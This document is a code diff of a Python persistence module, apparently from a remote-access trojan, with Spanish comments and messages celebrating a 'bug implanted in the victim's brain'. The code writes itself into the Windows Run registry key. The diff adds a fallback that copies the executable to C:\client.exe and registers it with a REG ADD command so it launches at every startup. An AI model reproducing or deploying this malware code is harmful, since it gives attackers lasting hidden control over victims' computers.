@@ -1,44 +1,54 @@
 
 # MODULO DE PERSISTENCIA -> CREADO POR KIRARI
 
-import sys
 import os
-
+import sys
+import shutil
 
 def windows_persistencia():
 
-	from win32api import (GetModuleFileName, 
-						  RegCloseKey, 
-						  RegDeleteValue,
-                          RegOpenKeyEx, 
-                          RegSetValueEx)
-
-	from win32con import (HKEY_LOCAL_MACHINE as HKCU, 
-		 				  KEY_WRITE, 
-		 				  REG_SZ)
-
-
-	SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-	EJECUTABLE = sys.argv[0]
-	RUTA = os.getcwd()+EJECUTABLE
-	
 	try:
+	
+		from win32api import (GetModuleFileName, 
+							  RegCloseKey, 
+							  RegDeleteValue,
+	                          RegOpenKeyEx, 
+	                          RegSetValueEx)
 
-		key = RegOpenKeyEx(HKCU, SUBKEY, 0, KEY_WRITE)
-		RegSetValueEx(key, EJECUTABLE, 0, REG_SZ, RUTA)
-		RegCloseKey(key)
+		from win32con import (HKEY_LOCAL_MACHINE as HKCU, 
+			 				  KEY_WRITE, 
+			 				  REG_SZ)
 
-	except WindowsError:
-		return (False," \nEl bicho no se ha podido implantar\n ")
 
-	return (True," \nBicho implantado en cerebro victima con exito\n ")
+		SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+		EJECUTABLE = sys.argv[0]
+		RUTA = os.getcwd()+EJECUTABLE
+		
+		try:
 
+			key = RegOpenKeyEx(HKCU, SUBKEY, 0, KEY_WRITE)
+			RegSetValueEx(key, EJECUTABLE, 0, REG_SZ, RUTA)
+			RegCloseKey(key)
+
+		except WindowsError:
+			return (False,"\n El bicho no se ha podido implantar \n")
+
+		return (True,"\n Bicho implantado en cerebro victima con exito \n")
+
+	except:
+		destino = "C:\\client.exe"
+		if not os.path.isfile(destino):
+			shutil.copyfile(sys.argv[0],destino)
+
+		os.system('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /t REG_SZ /d "C:\\Users\\Testing\\client.exe"')
+		return (True,"\n Bicho implantado en cerebro victima con exito \n")
+		
 
 def linux_persistencia():
-	return (False," \nEl bicho no se ha podido implantar\n ")
+	return (False,"\n El bicho no se ha podido implantar \n")
 
 def mac_persistencia():
-	return (False," \nEl bicho no se ha podido implantar\n ")
+	return (False,"\n El bicho no se ha podido implantar \n")
 
 
 def activar(plataforma):
@@ -56,4 +66,4 @@ def activar(plataforma):
 		return proceso,msg
 
 	else:
-		return (False," \nEl bicho no se ha podido implantar\n")
+		return (False,"\n El bicho no se ha podido implantar \n")
